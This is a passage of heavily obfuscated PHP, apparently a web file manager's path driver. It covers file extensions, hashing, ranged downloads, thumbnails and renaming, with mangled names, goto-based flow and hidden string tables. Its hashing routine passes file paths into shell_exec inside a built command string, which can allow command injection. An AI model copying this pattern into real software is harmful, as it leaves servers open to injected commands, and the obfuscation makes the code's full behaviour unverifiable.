$dæ÷ñº«¦[91]; $AÈöïâ×ÜÇ = (!$d÷Ú„¢çÙ– ? 1 : ceil($d÷Ú„¢çÙ– / pow(1024, 3))) * 3600 * 4; $d÷Á‘Òí’Ÿ = $this->{$DîÄ§ö†„}($fòÎ¼Ì§­, $AÈöïâ×ÜÇ); goto B¢˜²¤Àù¬; F¤´ÖÚ»ãğ: } public function uploadFormData($BÎŠÙÊÀš•, $A‘´İ¤‘¦ë = 3600) { } public function multiUploadFormData($A·ÈØÈŒ¡…, $cÎ§çîÁ°À = 3600) { } public function download($CåŞ„º, $AÅŠ¦‹¨ˆ†) { } public function ext($cÛ¬²ÑÛÌ) { $DÎæñ‡õÔ =& $_SERVER[ç]; if (strpos($cÛ¬²ÑÛÌ, $DÎæñ‡õÔ[8]) === -1) { $c°„¢µó¢„ = $cÛ¬²ÑÛÌ; } else { $c°„¢µó¢„ = $this->pathThis($cÛ¬²ÑÛÌ); } $BË­ƒô§¿ì = $DÎæñ‡õÔ[33]; if (strstr($c°„¢µó¢„, $DÎæñ‡õÔ[94])) { $BË­ƒô§¿ì = substr($c°„¢µó¢„, strrpos($c°„¢µó¢„, $DÎæñ‡õÔ[94]) + 1); $BË­ƒô§¿ì = strtolower($BË­ƒô§¿ì); } if (strlen($BË­ƒô§¿ì) > 3 && preg_match($DÎæñ‡õÔ[95], $BË­ƒô§¿ì, $b ÷†ğ»‰)) { $BË­ƒô§¿ì = $DÎæñ‡õÔ[33]; } return $BË­ƒô§¿ì; } public function pathThis($F…  ¶”Øä) { $dîŠ¥©Ú¸× =& $_SERVER[ç]; $F…  ¶”Øä = str_replace($dîŠ¥©Ú¸×[96], $dîŠ¥©Ú¸×[8], rtrim($F…  ¶”Øä, $dîŠ¥©Ú¸×[8])); $D…–õ„ = strrpos($F…  ¶”Øä, $dîŠ¥©Ú¸×[8]); if ($D…–õ„ === !1) { return $F…  ¶”Øä; } return substr($F…  ¶”Øä, $D…–õ„ + 1); } public function pathFather($dè‰’¸’Å) { $A·¸¡É¹ =& $_SERVER[ç]; $dè‰’¸’Å = str_replace($A·¸¡É¹[96], $A·¸¡É¹[8], rtrim($dè‰’¸’Å, $A·¸¡É¹[8])); $c£™¥ÃÆœí = strrpos($dè‰’¸’Å, $A·¸¡É¹[8]); if ($c£™¥ÃÆœí === !1) { return $A·¸¡É¹[33]; } return substr($dè‰’¸’Å, 0, $c£™¥ÃÆœí + 1); } public function hashSimple($a·ù©Á×©) { goto CË‚ôÇ¯ßè; E¬Å‚Á¦Ûå: $Dù©Ç”¾¦ä = intval($aŒ³ã—„ø½ / $F½‰¦àåÃ); $D˜İ˜¶Œ¯î = $a• ÃÃÓ˜¬[33]; for ($E¯Õ’ñíÈ = 0; $E¯Õ’ñíÈ < $F½‰¦àåÃ; $E¯Õ’ñíÈ++) { $D˜İ˜¶Œ¯î .= $this->fileSubstr($a·ù©Á×©, $Dù©Ç”¾¦ä * $E¯Õ’ñíÈ, $dÂËßÏÉÔõ); } goto Dí‹…¦Í´; Dí‹…¦Í´: $D˜İ˜¶Œ¯î .= $this->fileSubstr($a·ù©Á×©, $aŒ³ã—„ø½ - $dÂËßÏÉÔõ, $dÂËßÏÉÔõ); return md5($D˜İ˜¶Œ¯î) . $aŒ³ã—„ø½; goto CïÄšØ‘†ï; CË‚ôÇ¯ßè: $a• ÃÃÓ˜¬ =& $_SERVER[ç]; if (!$a·ù©Á×©) { return md5($a• ÃÃÓ˜¬[33]); } $aŒ³ã—„ø½ = $this->size($a·ù©Á×©); goto F†ªØ„²Çğ; F†ªØ„²Çğ: $dÂËßÏÉÔõ = 200; $F½‰¦àåÃ = 50; if ($aŒ³ã—„ø½ <= $dÂËßÏÉÔõ * $F½‰¦àåÃ) { return $this->hashMd5($a·ù©Á×©) . $aŒ³ã—„ø½; } goto E¬Å‚Á¦Ûå; CïÄšØ‘†ï: } public static $md5Cache = array(); public function hashMd5($fø·ëóß¨) { $fø·ëóß¨ = $this->iconvSystem($fø·ëóß¨); if (isset(self::$md5Cache[$fø·ëóß¨])) { return self::$md5Cache[$fø·ëóß¨]; } self::$md5Cache[$fø·ëóß¨] = $this->hashMd5Shell($fø·ëóß¨); if (!self::$md5Cache[$fø·ëóß¨]) { self::$md5Cache[$fø·ëóß¨] = @md5_file($fø·ëóß¨); } return self::$md5Cache[$fø·ëóß¨]; } private function hashMd5Shell($dìŸÂµ½ì˜) { goto C¼³­‹‚äÌ; C¼³­‹‚äÌ: $aÕÄ§×±‘ =& $_SERVER[ç]; if (!function_exists($aÕÄ§×±‘[97])) { return !1; } $F ÍËñˆÀï = array($aÕÄ§×±‘[98], $aÕÄ§×±‘[99]); goto D¢¥µŞ¯ß; E§³§ÑÆ¥³: $AƒÔØ‹ë¡ = shell_exec($DÅŸ°”Ó—ˆ . "\40\x22{$dìŸÂµ½ì˜}\42"); $AƒÔØ‹ë¡ = str_replace($aÕÄ§×±‘[103], $aÕÄ§×±‘[33], $AƒÔØ‹ë¡); return substr($AƒÔØ‹ë¡, 0, 32); goto bè‚Æ‰§Ô; D¢¥µŞ¯ß: $DÅŸ°”Ó—ˆ = Cache::get($aÕÄ§×±‘[100]); if (!$DÅŸ°”Ó—ˆ) { $A›Ë‘­Ú± = BASIC_PATH . $aÕÄ§×±‘[101]; $F¶®œ®Êµˆ = md5_file($A›Ë‘­Ú±); $DÅŸ°”Ó—ˆ = $aÕÄ§×±‘[102]; foreach ($F ÍËñˆÀï as $Cå½Ëºñí‘) { $AƒÔØ‹ë¡ = shell_exec($Cå½Ëºñí‘ . "\40\42{$A›Ë‘­Ú±}\x22"); if ($AƒÔØ‹ë¡ && substr(trim($AƒÔØ‹ë¡), 0, 32) == $F¶®œ®Êµˆ) { $DÅŸ°”Ó—ˆ = $Cå½Ëºñí‘; break; } } Cache::set($aÕÄ§×±‘[100], $DÅŸ°”Ó—ˆ, 3600); } if ($DÅŸ°”Ó—ˆ == $aÕÄ§×±‘[102]) { return !1; } goto E§³§ÑÆ¥³; bè‚Æ‰§Ô: } public function link($D‘–Æ…×«æ) { return $D‘–Æ…×«æ; } public function fileOut($Aß¨»œ‰ÄÁ, $F…ºªÕ×¤Ö = false, $f¬§¯ÌÔç = false, $c¶©¼Ëøİƒ = '') { goto a……ß¦íŠ; a……ß¦íŠ: $C¸Ÿš¸ò’Ñ =& $_SERVER[ç]; $this->cacheMethod(null, null); if (!$Aß¨»œ‰ÄÁ || !$this->exist($Aß¨»œ‰ÄÁ)) { show_json(LNG($C¸Ÿš¸ò’Ñ[104]), !1, $f¬§¯ÌÔç); } goto f Ü«ì÷„¸; CÌ”í» æå: if ($bÜ•Û»²ô§) { $CœèÙ•î¶ƒ = intval(1000 * 1000 * ($Aì•Ï‹ÒŒ / $bÜ•Û»²ô§)); } while ($c£ö…©¹‚ <= $FĞÕ‡Ù÷’”) { $DƒÚˆªµËë = timeFloat(); check_abort(); $b‰ÔŠ¸ØÇ‚ = $FĞÕ‡Ù÷’” - $c£ö…©¹‚ + 1; if ($b‰ÔŠ¸ØÇ‚ <= $Aì•Ï‹ÒŒ) { $Aì•Ï‹ÒŒ = $b‰ÔŠ¸ØÇ‚; } echo $this->fileSubstr($Aß¨»œ‰ÄÁ, $c£ö…©¹‚, $Aì•Ï‹ÒŒ); $c£ö…©¹‚ += $Aì•Ï‹ÒŒ; if ($Aì•Ï‹ÒŒ == $b‰ÔŠ¸ØÇ‚) { $c£ö…©¹‚ = $FĞÕ‡Ù÷’” + 1; } if ($CœèÙ•î¶ƒ) { $a¢ÃêÁ¥‘ = intval(1000 * 1000 * (timeFloat() - $DƒÚˆªµËë)); $dÚôæÙ©õç = $CœèÙ•î¶ƒ - $a¢ÃêÁ¥‘; if ($dÚôæÙ©õç > 5) { usleep($dÚôæÙ©õç); } } } goto Còñîª¸Š; EöÀ‰Óêİ: $fˆ‰Í–¹è = $AÃÌ»é¤´[$C¸Ÿš¸ò’Ñ[77]]; $a§¹¾›°âÏ = gmdate($C¸Ÿš¸ò’Ñ[109], $AÃÌ»é¤´[$C¸Ÿš¸ò’Ñ[83]]); $B›Øö®œâ = $f¬§¯ÌÔç ? $f¬§¯ÌÔç : $this->iconvApp($AÃÌ»é¤´[$C¸Ÿš¸ò’Ñ[28]]); goto eò—öâÎ; BÄ‰¿Î­Ê: header($C¸Ÿš¸ò’Ñ[137] . $fˆ‰Í–¹è); header($C¸Ÿš¸ò’Ñ[138]); if (!$F…ºªÕ×¤Ö && $fÄ†Ş‘íµ == $C¸Ÿš¸ò’Ñ[139]) { if ($fˆ‰Í–¹è > 1024 * 1024 * 5) { die; } $bö÷Ñ½µ‡ = $this->getContent($Aß¨»œ‰ÄÁ); $bö÷Ñ½µ‡ = Html::clearSVG($bö÷Ñ½µ‡); header($C¸Ÿš¸ò’Ñ[140] . strlen($bö÷Ñ½µ‡)); echo $bö÷Ñ½µ‡; die; } goto c‰¸®²‰¢à; A¶ø¤‰¢‰‰: if (isset($_SERVER[$C¸Ÿš¸ò’Ñ[130]]) && strtotime($_SERVER[$C¸Ÿš¸ò’Ñ[130]]) == $AÃÌ»é¤´[$C¸Ÿš¸ò’Ñ[83]]) { header($C¸Ÿš¸ò’Ñ[131], !0, 304); die; } if (isset($_SERVER[$C¸Ÿš¸ò’Ñ[132]]) && $_SERVER[$C¸Ÿš¸ò’Ñ[132]] == $c¶©¼Ëøİƒ) { header($C¸Ÿš¸ò’Ñ[133] . $c¶©¼Ëøİƒ, !0, 304); die; } header($C¸Ÿš¸ò’Ñ[133] . $c¶©¼Ëøİƒ); goto eÊëäªí• ; a°§Îá¹‚õ: @ob_end_clean(); set_timeout(); $AÃÌ»é¤´ = $this->infoFull($Aß¨»œ‰ÄÁ); goto EöÀ‰Óêİ; Cªò¤óöåÉ: header($C¸Ÿš¸ò’Ñ[119]); header($C¸Ÿš¸ò’Ñ[120] . $E³Î‡êŒ¶–); $AÃ¿Ñ»êÉ = rawurlencode($B›Øö®œâ); goto f¢¡ñ–ïƒà; FÚ§Ë‰í‘ù: if (in_array($fÄ†Ş‘íµ, array($C¸Ÿš¸ò’Ñ[110], $C¸Ÿš¸ò’Ñ[111], $C¸Ÿš¸ò’Ñ[112], $C¸Ÿš¸ò’Ñ[113]))) { $fÄ†Ş‘íµ = $C¸Ÿš¸ò’Ñ[114]; } if (!$c¶©¼Ëøİƒ) { $c¶©¼Ëøİƒ = md5($a§¹¾›°âÏ . $this->hashSimple($Aß¨»œ‰ÄÁ)); } $c¶©¼Ëøİƒ = $C¸Ÿš¸ò’Ñ[115] . $c¶©¼Ëøİƒ . $C¸Ÿš¸ò’Ñ[115]; goto cƒÖŸ¢³ƒº; eÊëäªí• : header($C¸Ÿš¸ò’Ñ[134] . $a§¹¾›°âÏ . $C¸Ÿš¸ò’Ñ[126]); header($C¸Ÿš¸ò’Ñ[135] . $B›Øö®œâ); header($C¸Ÿš¸ò’Ñ[136]); goto BÄ‰¿Î­Ê; Bä÷æçÑÌ»: if ($_SERVER[$C¸Ÿš¸ò’Ñ[156]] == $C¸Ÿš¸ò’Ñ[157]) { return; } $Aì•Ï‹ÒŒ = 1024 * 100; $CœèÙ•î¶ƒ = 0; goto CÌ”í» æå; eò—öâÎ: $c£ö…©¹‚ = 0; $FĞÕ‡Ù÷’” = $fˆ‰Í–¹è - 1; $fÄ†Ş‘íµ = $this->ext($B›Øö®œâ); goto FÚ§Ë‰í‘ù; cƒÖŸ¢³ƒº: $E³Î‡êŒ¶– = get_file_mime($fÄ†Ş‘íµ); if (strstr($E³Î‡êŒ¶–, $C¸Ÿš¸ò’Ñ[116])) { $E³Î‡êŒ¶– = $E³Î‡êŒ¶– . $C¸Ÿš¸ò’Ñ[117]; } if ($F…ºªÕ×¤Ö === !1 && !mime_support($E³Î‡êŒ¶–)) { $F…ºªÕ×¤Ö = !0; $E³Î‡êŒ¶– = $C¸Ÿš¸ò’Ñ[118]; } goto Cªò¤óöåÉ; f¢¡ñ–ïƒà: $AÃ¿Ñ»êÉ = $C¸Ÿš¸ò’Ñ[115] . $AÃ¿Ñ»êÉ . $C¸Ÿš¸ò’Ñ[121] . $AÃ¿Ñ»êÉ; if ($F…ºªÕ×¤Ö) { header($C¸Ÿš¸ò’Ñ[122]); header($C¸Ÿš¸ò’Ñ[123] . $AÃ¿Ñ»êÉ); } else { header($C¸Ÿš¸ò’Ñ[124] . $AÃ¿Ñ»êÉ); } header($C¸Ÿš¸ò’Ñ[125] . gmdate($C¸Ÿš¸ò’Ñ[109], time() + 3600 * 24 * 30) . $C¸Ÿš¸ò’Ñ[126]); goto d±£Š¼ã®È; f Ü«ì÷„¸: $eõî‰¸‚…Ô = $this->getType() == $C¸Ÿš¸ò’Ñ[105]; $aùäß¬ĞöÈ = $GLOBALS[$C¸Ÿš¸ò’Ñ[6]][$C¸Ÿš¸ò’Ñ[87]][$C¸Ÿš¸ò’Ñ[106]][$C¸Ÿš¸ò’Ñ[107]]; $bÜ•Û»²ô§ = (double) $GLOBALS[$C¸Ÿš¸ò’Ñ[6]][$C¸Ÿš¸ò’Ñ[87]][$C¸Ÿš¸ò’Ñ[106]][$C¸Ÿš¸ò’Ñ[108]] * 1024 * 1024; goto a°§Îá¹‚õ; d±£Š¼ã®È: header($C¸Ÿš¸ò’Ñ[127]); header($C¸Ÿš¸ò’Ñ[128]); header($C¸Ÿš¸ò’Ñ[129]); goto A¶ø¤‰¢‰‰; b©ŠùÂ¹ˆÚ: $BæñØÓò¼ = !0; if ($_SERVER[$C¸Ÿš¸ò’Ñ[153]] == $C¸Ÿš¸ò’Ñ[154] && $fˆ‰Í–¹è > 1204 * 1024 * 1024 * 2) { $BæñØÓò¼ = !1; } if ($BæñØÓò¼) { header($C¸Ÿš¸ò’Ñ[155] . ($FĞÕ‡Ù÷’” - $c£ö…©¹‚ + 1)); } goto Bä÷æçÑÌ»; c‰¸®²‰¢à: $cğ°ŠÙÎâ = strtolower($_SERVER[$C¸Ÿš¸ò’Ñ[141]]); if ($eõî‰¸‚…Ô && $cğ°ŠÙÎâ && $aùäß¬ĞöÈ) { if (strstr($cğ°ŠÙÎâ, $C¸Ÿš¸ò’Ñ[142])) { header($C¸Ÿš¸ò’Ñ[143] . $Aß¨»œ‰ÄÁ); } else { if (strstr($cğ°ŠÙÎâ, $C¸Ÿš¸ò’Ñ[144])) { header($C¸Ÿš¸ò’Ñ[145] . $Aß¨»œ‰ÄÁ); } else { if (strstr($cğ°ŠÙÎâ, $C¸Ÿš¸ò’Ñ[146])) { header($C¸Ÿš¸ò’Ñ[147] . $Aß¨»œ‰ÄÁ); } } } if ($bÜ•Û»²ô§) { header($C¸Ÿš¸ò’Ñ[148] . $bÜ•Û»²ô§); } return; } if (isset($_SERVER[$C¸Ÿš¸ò’Ñ[149]])) { if (preg_match($C¸Ÿš¸ò’Ñ[150], $_SERVER[$C¸Ÿš¸ò’Ñ[149]], $c¹é¨×ˆÌ)) { $c£ö…©¹‚ = intval($c¹é¨×ˆÌ[1]); if (!empty($c¹é¨×ˆÌ[2])) { $FĞÕ‡Ù÷’” = intval($c¹é¨×ˆÌ[2]); } } header($C¸Ÿš¸ò’Ñ[151]); header("\103\157\x6e\164\145\x6e\164\55\122\x61\x6e\x67\x65\72\40\x62\171\x74\x65\x73\40{$c£ö…©¹‚}\x2d{$FĞÕ‡Ù÷’”}\57" . $fˆ‰Í–¹è); } else { header($C¸Ÿš¸ò’Ñ[152]); } goto b©ŠùÂ¹ˆÚ; Còñîª¸Š: } public function fileOutServer($AôøÀˆšÑ™, $eïõĞ§‹ = false, $cµŸéÊÌ  = false, $EçÓ®°î = '') { $this->fileOut($AôøÀˆšÑ™, $eïõĞ§‹, $cµŸéÊÌ , $EçÓ®°î); } public function fileOutLink($Eï¸ğÂ¶È°) { header($_SERVER[ç][158] . $Eï¸ğÂ¶È°); die; } public function cacheMethod($c°óç‚õ§, $eøßÀË±·”, $Aô‰Êˆå¿© = null) { goto FİİÎÄÏß—; aåÜˆãÓÂ¿: $cŠ—ÈõÓ÷™ = $bäÛ›¹À•[159] . $c°óç‚õ§ . $bäÛ›¹À•[160] . rtrim($eŠ‰—ŸàÉ–, $bäÛ›¹À•[8]); if (is_null($c°óç‚õ§)) { $CÂ‡ôó˜·† = array(); return; } if (is_null($eøßÀË±·”)) { unset($CÂ‡ôó˜·†[$cŠ—ÈõÓ÷™]); return; } goto AÓ­–‚ÖØ; F÷÷àÓêÅ: $B«Œ¶îâĞ = $this->{$c°óç‚õ§}($eøßÀË±·”); $CÂ‡ôó˜·†[$cŠ—ÈõÓ÷™] = $B«Œ¶îâĞ; return $B«Œ¶îâĞ; goto E–‰Ìæôòª; AÓ­–‚ÖØ: if (!is_null($Aô‰Êˆå¿©)) { $CÂ‡ôó˜·†[$cŠ—ÈõÓ÷™] = $Aô‰Êˆå¿©; return; } $B«Œ¶îâĞ = isset($CÂ‡ôó˜·†[$cŠ—ÈõÓ÷™]) ? $CÂ‡ôó˜·†[$cŠ—ÈõÓ÷™] : null; if (!is_null($B«Œ¶îâĞ)) { return $B«Œ¶îâĞ; } goto F÷÷àÓêÅ; FİİÎÄÏß—: $bäÛ›¹À• =& $_SERVER[ç]; static $CÂ‡ôó˜·† = array(); $eŠ‰—ŸàÉ– = $eøßÀË±·” ? ltrim($this->getPathOuter($eøßÀË±·”), $bäÛ›¹À•[8]) : $eøßÀË±·”; goto aåÜˆãÓÂ¿; E–‰Ìæôòª: } public function fileOutImage($DİÎš®ÔÙ…, $bƒøŸ½Ü”Û = 250) { goto cÌÁ÷šØâÇ; E…§‘Öµ”: if (!($d¤»©é = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $fÒ«ïğîà[171]))) { $A™¼íš’Íî = IO::mkdir(IO_PATH_SYSTEM_TEMP . $fÒ«ïğîà[172]); } else { $A™¼íš’Íî = KodIO::make($d¤»©é); } if ($d¤»©é = IO::fileNameExist($A™¼íš’Íî, $eºø­ßŠ¦)) { $fò¸º„ğ…ğ = KodIO::make($d¤»©é); return IO::fileOut($fò¸º„ğ…ğ, !1, $aİƒÚ’º¡™); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto b±÷İîî¨°; e‚¨Óùóß‡: if (!file_exists($fò¸º„ğ…ğ) || filesize($fò¸º„ğ…ğ) < 100) { return @file_exists($Fé¿‘ò¬¸Í) ? IO::fileOut($Fé¿‘ò¬¸Í) : $this->fileOut($DİÎš®ÔÙ…); } if (!($dŸ¥  ×£˜ = IO::move($fò¸º„ğ…ğ, $A™¼íš’Íî))) { return IO::fileOut($fò¸º„ğ…ğ); } del_file($fò¸º„ğ…ğ); goto aå’´‚ï§; eîë§©´¿¼: if ($bÊŸİƒ¶À[$fÒ«ïğîà[77]] <= 1024 * 50 || $C£™ ¿„Õ„ || !function_exists($fÒ«ïğîà[166]) || $bÊŸİƒ¶À[$fÒ«ïğîà[167]] == $fÒ«ïğîà[168]) { return $this->fileOut($DİÎš®ÔÙ…, !1, $aİƒÚ’º¡™); } if (isset($bÊŸİƒ¶À[$fÒ«ïğîà[163]][$fÒ«ïğîà[169]])) { $a¨³•áßá = $bÊŸİƒ¶À[$fÒ«ïğîà[163]][$fÒ«ïğîà[169]]; } else { if (isset($bÊŸİƒ¶À[$fÒ«ïğîà[163]][$fÒ«ïğîà[170]])) { $a¨³•áßá = $bÊŸİƒ¶À[$fÒ«ïğîà[163]][$fÒ«ïğîà[170]]; } else { $a¨³•áßá = md5("{$bÊŸİƒ¶À[$fÒ«ïğîà[28]]}\x5f{$bÊŸİƒ¶À[$fÒ«ïğîà[75]]}\137{$bÊŸİƒ¶À[$fÒ«ïğîà[77]]}"); } } $eºø­ßŠ¦ = "{$a¨³•áßá}\137{$bƒøŸ½Ü”Û}\56\x70\x6e\147"; goto E…§‘Öµ”; cÌÁ÷šØâÇ: $fÒ«ïğîà =& $_SERVER[ç]; if (substr($DİÎš®ÔÙ…, 0, 4) == $fÒ«ïğîà[146]) { $this->fileOutLink($DİÎš®ÔÙ…); } $bÊŸİƒ¶À = $this->info($DİÎš®ÔÙ…); goto cÂ·Šº‡­˜; b±÷İîî¨°: $fò¸º„ğ…ğ = DATA_THUMB . $eºø­ßŠ¦; del_file($fò¸º„ğ…ğ); if (!@file_exists($fò¸º„ğ…ğ)) { $CÀÀ™ö¸ø = TEMP_FILES; if (!is_dir($CÀÀ™ö¸ø)) { mk_dir($CÀÀ™ö¸ø); } $Fé¿‘ò¬¸Í = $CÀÀ™ö¸ø . $a¨³•áßá . $fÒ«ïğîà[94] . $bÊŸİƒ¶À[$fÒ«ïğîà[167]]; if (!@file_exists($Fé¿‘ò¬¸Í)) { $Fé¿‘ò¬¸Í = $this->download($DİÎš®ÔÙ…, $Fé¿‘ò¬¸Í); } $fî¥™â¥“ = new ImageThumb($Fé¿‘ò¬¸Í, $fÒ«ïğîà[173]); $fî¥™â¥“->prorate($fò¸º„ğ…ğ, $bƒøŸ½Ü”Û, $bƒøŸ½Ü”Û * 10); } goto e‚¨Óùóß‡; cÂ·Šº‡­˜: $aİƒÚ’º¡™ = $bÊŸİƒ¶À[$fÒ«ïğîà[28]]; $C£™ ¿„Õ„ = !1; if (isset($GLOBALS[$fÒ«ïğîà[161]]) && $GLOBALS[$fÒ«ïğîà[161]][$fÒ«ïğîà[75]] == $bÊŸİƒ¶À[$fÒ«ïğîà[75]]) { $c× Àéª¡Ç = $GLOBALS[$fÒ«ïğîà[161]][$fÒ«ïğîà[162]]; if (!$bÊŸİƒ¶À[$fÒ«ïğîà[163]]) { $bÊŸİƒ¶À[$fÒ«ïğîà[163]] = $GLOBALS[$fÒ«ïğîà[161]]; } if (isset($c× Àéª¡Ç[$fÒ«ïğîà[164]])) { if ($c× Àéª¡Ç[$fÒ«ïğîà[164]] <= $bƒøŸ½Ü”Û && $c× Àéª¡Ç[$fÒ«ïğîà[165]] <= $bƒøŸ½Ü”Û) { $C£™ ¿„Õ„ = !0; } } $aİƒÚ’º¡™ = $bÊŸİƒ¶À[$fÒ«ïğîà[163]][$fÒ«ïğîà[28]]; } goto eîë§©´¿¼; aå’´‚ï§: IO::fileOut($dŸ¥  ×£˜); goto F¼áˆ¢›àô; F¼áˆ¢›àô: } public function fileOutImageServer($eŒÖß·÷„á, $dù¿£´‚òÊ = 250) { $this->fileOutImage($eŒÖß·÷„á, $dù¿£´‚òÊ); } public function fileNameAuto($DòÅô§‰¦, $aë¬¶”ïŞ, $EáÙğø­Ø° = REPEAT_RENAME, $a‚·äç®º = false) { goto EŞ©…‡Ş•ó; EŞ©…‡Ş•ó: $CÅÃÕÎ¯’ =& $_SERVER[ç]; $F”Ã‡„ÓÃ½ = $DòÅô§‰¦ === $CÅÃÕÎ¯’[33] ? $aë¬¶”ïŞ : rtrim($DòÅô§‰¦, $CÅÃÕÎ¯’[8]) . $CÅÃÕÎ¯’[8] . $aë¬¶”ïŞ; if ($EáÙğø­Ø° == REPEAT_REPLACE || !$this->exist($F”Ã‡„ÓÃ½) || $a‚·äç®º && $EáÙğø­Ø° != REPEAT_RENAME_FOLDER) { return $aë¬¶”ïŞ; } goto C¿î¡çÕ; fíÄ ó£“Ü: $cæ²èøÇ¹‰ = 1; $b°ºÀÂ±ã­ = substr($aë¬¶”ïŞ, 0, strlen($aë¬¶”ïŞ) - strlen($d”ÓøÔÚŸ)); $Bâ†Å™ãù = $b°ºÀÂ±ã­ . "\50{$cæ²èøÇ¹‰}\x29{$d”ÓøÔÚŸ}"; goto dƒ¦• ÅŒ; C¿î¡çÕ: if ($EáÙğø­Ø° == REPEAT_SKIP) { return !1; } $d”ÓøÔÚŸ = $CÅÃÕÎ¯’[94] . get_path_ext($aë¬¶”ïŞ); $d”ÓøÔÚŸ = $d”ÓøÔÚŸ == $CÅÃÕÎ¯’[94] || $a‚·äç®º ? $CÅÃÕÎ¯’[33] : $d”ÓøÔÚŸ; goto fíÄ ó£“Ü; dƒ¦• ÅŒ: while ($this->exist(rtrim($DòÅô§‰¦, $CÅÃÕÎ¯’[8]) . $CÅÃÕÎ¯’[8] . $Bâ†Å™ãù)) { $Bâ†Å™ãù = $b°ºÀÂ±ã­ . "\x28{$cæ²èøÇ¹‰}\x29{$d”ÓøÔÚŸ}"; $cæ²èøÇ¹‰++; } return $Bâ†Å™ãù; goto CæÌ–»íèÒ; CæÌ–»íèÒ: } private function fileNameAutoList($fõÊ¡×¼ö, $D©Õë¶‘›, $c­¼è¶ « = false) { goto A—ğôÓŠØ¢; B½›°‘ß²: return $b¤­ÆÀŒ‰§; goto aóÓä÷‹Ä; Bù¢Şñ¥ƒ±: $BŠ‡µî§ŒĞ = substr($D©Õë¶‘›, 0, strlen($D©Õë¶‘›) - strlen($bÄ°²™š“)); $b¤­ÆÀŒ‰§ = $BŠ‡µî§ŒĞ . "\50\60\51{$bÄ°²™š“}"; for ($fÄâ½¿Ğ£ = 1; $fÄâ½¿Ğ£ <= count($bªºïéÈ) + 1; $fÄâ½¿Ğ£++) { $b¤­ÆÀŒ‰§ = $BŠ‡µî§ŒĞ . "\50{$fÄâ½¿Ğ£}\51{$bÄ°²™š“}"; if (!in_array_not_case($b¤­ÆÀŒ‰§, $bªºïéÈ)) { return $b¤­ÆÀŒ‰§; } } goto B½›°‘ß²; f’ÉÕØœäå: $bªºïéÈ = array_to_keyvalue($aÂ‹óâ“šÍ, $dòëùŞƒÜÃ[33], $dòëùŞƒÜÃ[28]); $bÄ°²™š“ = $dòëùŞƒÜÃ[94] . get_path_ext($D©Õë¶‘›); $bÄ°²™š“ = $bÄ°²™š“ == $dòëùŞƒÜÃ[94] || $c­¼è¶ « ? $dòëùŞƒÜÃ[33] : $bÄ°²™š“; goto Bù¢Şñ¥ƒ±; A—ğôÓŠØ¢: $dòëùŞƒÜÃ =& $_SERVER[ç]; $aÂ‹óâ“šÍ = $this->listPath($fõÊ¡×¼ö, !0); $aÂ‹óâ“šÍ = array_merge($aÂ‹óâ“šÍ[$dòëùŞƒÜÃ[74]], $aÂ‹óâ“šÍ[$dòëùŞƒÜÃ[73]]); goto f’ÉÕØœäå; aóÓä÷‹Ä: } public function listAllFiles($aè«è Å , $cÃƒ®ÃùÂ, $F¸Å±Ü©„ = array()) { goto C±‹³½˜Ôƒ; C³Á½õ§òá: $aè«è Å  = trim($aè«è Å , $b§™ÚØ‡‰[8]); foreach ($cÃƒ®ÃùÂ as $dÂ‘èËˆ‚›) { $c²øçİ“ËÅ = ltrim(substr(trim($dÂ‘èËˆ‚›, $b§™ÚØ‡‰[8]), strlen($aè«è Å )), $b§™ÚØ‡‰[8]); $Bœ²Í“Õ = array_merge($Bœ²Í“Õ, $this->slicePath($c²øçİ“ËÅ)); } $fĞé³Ì…÷ = array(); goto AæÚ£ŠÄ¦¶; C±‹³½˜Ôƒ: $b§™ÚØ‡‰ =& $_SERVER[ç]; if (empty($cÃƒ®ÃùÂ)) { return array(); } $Bœ²Í“Õ = array(); goto C³Á½õ§òá; AæÚ£ŠÄ¦¶: foreach (array_unique($Bœ²Í“Õ) as $dÂ‘èËˆ‚›) { $d×É¡Ş–¤ = array($b§™ÚØ‡‰[75] => $this->getPathOuter($b§™ÚØ‡‰[8] . $aè«è Å  . $b§™ÚØ‡‰[8] . $dÂ‘èËˆ‚›), $b§™ÚØ‡‰[76] => 1, $b§™ÚØ‡‰[77] => 0); if (substr($dÂ‘èËˆ‚›, -1) != $b§™ÚØ‡‰[8]) { $d×É¡Ş–¤[$b§™ÚØ‡‰[76]] = 0; $C¢˜ßÊƒ = $this->getPath($aè«è Å  . $b§™ÚØ‡‰[8] . $dÂ‘èËˆ‚›); $d×É¡Ş–¤[$b§™ÚØ‡‰[77]] = isset($F¸Å±Ü©„[$C¢˜ßÊƒ]) ? $F¸Å±Ü©„[$C¢˜ßÊƒ] : $this->size($C¢˜ßÊƒ); } $fĞé³Ì…÷[] = $d×É¡Ş–¤; } return $fĞé³Ì…÷; goto A‘šÁŞ«—; A‘šÁŞ«—: } public function slicePath($A×‚‰éÙ‚) { $aÔº–ƒ‰¶ =& $_SERVER[ç]; $e¥å«¹ÍØ = explode($aÔº–ƒ‰¶[8], trim($A×‚‰éÙ‚, $aÔº–ƒ‰¶[8])); $DĞÁòà´Ø² = 0; do { ++$DĞÁòà´Ø²; $fËØã£…¹[] = implode($aÔº–ƒ‰¶[8], array_slice($e¥å«¹ÍØ, 0, $DĞÁòà´Ø²)) . $aÔº–ƒ‰¶[8]; } while ($DĞÁòà´Ø² < count($e¥å«¹ÍØ)); $fËØã£…¹[count($e¥å«¹ÍØ) - 1] = $A×‚‰éÙ‚; return $fËØã£…¹; } public function getHost() { $C›Ç¾¤çöà =& $_SERVER[ç]; $B„ò•ŠÑ½½ = parse_url(trim($this->domain, $C›Ç¾¤çöà[8])); $aŸİÚÛ…â = isset($B„ò•ŠÑ½½[$C›Ç¾¤çöà[174]]) ? $B„ò•ŠÑ½½[$C›Ç¾¤çöà[174]] : http_type(); $A¿®ÙºÇ‹› = isset($B„ò•ŠÑ½½[$C›Ç¾¤çöà[175]]) ? $B„ò•ŠÑ½½[$C›Ç¾¤çöà[175]] : $B„ò•ŠÑ½½[$C›Ç¾¤çöà[75]]; if (isset($B„ò•ŠÑ½½[$C›Ç¾¤çöà[176]])) { $A¿®ÙºÇ‹› .= $C›Ç¾¤çöà[4] . $B„ò•ŠÑ½½[$C›Ç¾¤çöà[176]]; } return $aŸİÚÛ…â . $C›Ç¾¤çöà[177] . $A¿®ÙºÇ‹›; } public function pathEncode($AÔ®’ÜŸ¸š) { $A…‰·‘»Öñ =& $_SERVER[ç]; return str_replace($A…‰·‘»Öñ[178], $A…‰·‘»Öñ[8], rawurlencode($AÔ®’ÜŸ¸š)); } } class PathDriverBaseS3 extends 